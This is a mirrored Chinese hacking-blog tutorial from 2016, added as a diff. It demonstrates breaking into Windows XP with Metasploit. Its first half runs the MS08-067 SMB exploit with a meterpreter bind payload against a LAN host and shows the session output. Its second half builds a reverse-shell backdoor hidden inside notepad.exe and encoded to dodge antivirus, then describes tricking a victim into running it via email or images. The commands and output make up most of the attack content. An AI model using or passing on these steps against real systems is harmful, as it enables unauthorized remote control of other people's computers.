@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html>
+  
+<!-- Mirrored from topspeedsnail.com/kali-linux-n-hack-windows-xp/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 04:22:27 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <title>演示使用Metasploit入侵Windows</title>
+
+        <meta charset="utf-8" />
+    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>
+
+    
+    <meta name="description" content="我使用Kali Linux的IP地址是192.168.0.112；在同一局域网内有一台运行Windows XP（192.168.0.108）的测试电脑。
+
+" />
+    <meta property="og:description" content="我使用Kali Linux的IP地址是192.168.0.112；在同一局域网内有一台运行Windows XP（192.168.0.108）的测试电脑。
+
+" />
+    
+    <meta name="author" content="Elephant And Balloon" />
+
+    
+    <meta property="og:title" content="演示使用Metasploit入侵Windows" />
+    <meta property="twitter:title" content="演示使用Metasploit入侵Windows" />
+    
+
+    <!--[if lt IE 9]>
+      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link rel="stylesheet" type="text/css" href="../style.css" />
+    <link rel="alternate" type="application/rss+xml" title="Elephant And Balloon - 关于黑技术的小博客" href="../feed.xml" />
+
+    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
+  </head>
+
+  <body>
+    <div class="wrapper-masthead">
+      <div class="container">
+        <header class="masthead clearfix">
+          <a href="../index.html" class="site-avatar"><img src="https://avatars1.githubusercontent.com/u/5637917?v=3&amp;s=140" /></a>
+
+          <div class="site-info">
+            <h1 class="site-name"><a href="../index.html">Elephant And Balloon</a></h1>
+            <p class="site-description">关于黑技术的小博客</p>
+          </div>
+
+          <nav>
+            <a href="../index.html">主页</a>
+            <a href="../about/index.html">关于我</a>
+          </nav>
+
+        </header>
+      </div>
+    </div>
+
+    <div id="main" role="main" class="container">
+      <article class="post">
+  <h1>演示使用Metasploit入侵Windows</h1>
+
+  <div class="entry">
+    <p>我使用Kali Linux的IP地址是192.168.0.112；在同一局域网内有一台运行Windows XP（192.168.0.108）的测试电脑。</p>
+
+<p>本文演示怎么使用Metasploit入侵windows xp sp3。</p>
+
+<p>启动msfconsole：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># msfconsole</span></code></pre></figure>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-15%2015-24-25.png" alt="msfconsole" /></p>
+
+<p>选择一个漏洞：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">msf &gt; search platform: windows xp sp3 </code></pre></figure>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-15%2017-17-46.png" alt="msfconsole" /></p>
+
+<p>exploit/windows/smb/ms08_067_netapi是08年发现的漏洞，等级Great。</p>
+
+<p>查看某个漏洞的详细信息；包含使用方法、支持的平台等等，非常有帮助：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">msf &gt; info exploit/windows/smb/ms08_067_netapi</code></pre></figure>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-15%2017-24-32.png" alt="msfconsole" /></p>
+
+<p>依次执行如下命令：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">msf &gt; use exploit/windows/smb/ms08_067_netapi
+<span class="gp">&gt; </span><span class="nb">set </span>payload windows/meterpreter/bind_tcp
+<span class="gp">&gt; </span><span class="nb">set </span>RHOST 192.168.0.108  <span class="o">(</span>设置目标主机IP地址<span class="o">)</span>
+<span class="gp">&gt; </span>exploit</code></pre></figure>
+
+<p>如果目标主机有这个漏洞的话，你就可以控制它了；如果没有，尝试使用其他漏洞。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>[*] Started bind handler
+[*] Automatically detecting the target...
+[*] Fingerprint: Windows XP SP3 - Service Pack 3 - lang:Chinese
+[*] Selected Target: Windows XP SP3 Chinese (AlwaysOn NK)
+[*] Attempting to trigger the vulnerability...
+[*] Sending stage (751104 bytes) to 192.168.0.108
+[*] Meterpreter session 1 opened (192.168.0.1:41614 -&gt; 192.168.0.108:4444) at 2016-04-15 17:29:32
+
+meterpreter &gt;
+</code></pre>
+</div>
+
+<p>现在你就可以控制目标主机了，可以截屏、录音、视频、下载文件、杀进程等等；使用help查看可以执行的命令。</p>
+
+<hr />
+
+<h2 id="演示使用后门程序侵入windows">演示使用后门程序侵入Windows</h2>
+
+<p>原理：在Kali Linux上生成后门程序，然后把它发送给受害者，欺骗受害者运行（使用邮件、图片等等）。难点是需要过杀毒软件和防火墙。</p>
+
+<p>生成后门程序：</p>
+
+<p>我把后门程序隐藏到记事本程序中：notepad.exe</p>
+
+<p>查看Kali Linux的IP：ifconfig（192.168.0.112）</p>
+
+<p>创建后门程序，my_backdoor.exe：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=4445 -x NOTEPAD.EXE -e x86/jmp_call_additive -i 4 -k -f exe &gt; my_backdoor.exe</span></code></pre></figure>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-15%2018-24-42.png" alt="msfconsole" /></p>
+
+<p>上面命令使用加密试图躲过杀毒软件，但是，不要期望它可以生效。使用man msfvenom查看帮助。</p>
+
+<p>把它发送到Windows系统，并运行；如果不能运行换用其他加密方式。</p>
+
+<p>启动msfconsole：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># msfconsole</span></code></pre></figure>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>use exploit/multi/handler
+
+set LHOST 192.168.0.112
+set LPORT 4445
+set payload windows/meterpreter/reverse_tcp
+show options
+exploit
+</code></pre>
+</div>
+
+<p>等待受害者启动后门程序。</p>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-15%2019-01-13.png" alt="msfconsole" /></p>
+
+<p>OK，入侵成功。</p>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-15%2019-08-43.png" alt="msfconsole" /></p>
+
+<hr />
+
+<p><a href="../kali-linux-metasploit-base-use/index.html">Metasploit的基本使用</a></p>
+
+<p><a href="../kali-linux-metasploit-hack-android/index.html">演示使用Metasploit入侵Android</a></p>
+
+  </div>
+
+  <div class="date">
+    Written on April 15, 2016
+  </div>
+
+  
+<div class="comments">
+	<div id="disqus_thread"></div>
+	<script type="text/javascript">
+
+	    var disqus_shortname = 'elephantandballoon';
+
+	    (function() {
+	        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+	        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+	        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	    })();
+
+	</script>
+	<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+</article>
+
+    </div>
+
+    <div class="wrapper-footer">
+      <div class="container">
+        <footer class="footer">
+          
+
+
+
+<a href="https://github.com/tiancode"><i class="svg-icon github"></i></a>
+
+
+
+
+
+
+
+
+
+        </footer>
+      </div>
+    </div>
+
+    
+	<!-- Google Analytics -->
+	<script>
+		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','http://www.google-analytics.com/analytics.js','ga');
+
+		ga('create', 'UA-75657205-1', 'auto');
+		ga('send', 'pageview', {
+		  'page': '/kali-linux-n-hack-windows-xp/',
+		  'title': '演示使用Metasploit入侵Windows'
+		});
+	</script>
+	<!-- End Google Analytics -->
+
+
+  </body>
+
+<!-- Mirrored from topspeedsnail.com/kali-linux-n-hack-windows-xp/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 04:24:28 GMT -->
+</html>
